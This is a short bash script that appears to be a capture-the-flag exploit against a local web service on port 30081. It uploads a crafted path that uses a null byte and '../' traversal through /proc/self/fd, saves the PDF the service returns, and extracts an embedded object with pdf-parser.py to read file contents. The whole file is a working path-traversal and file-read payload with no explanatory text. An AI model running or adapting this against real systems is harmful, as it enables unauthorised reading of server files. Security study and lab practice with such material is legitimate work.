#!/bin/bash

printf "/proc/self/fd/1\x00/../../../../../app/assets/doge.svg" | curl -s -F "image-presets=@-" "localhost:30081" > tmp$1.pdf
python pdf-parser.py tmp$1.pdf --object 4 --raw --filter | grep Image
rm tmp$1.pdf
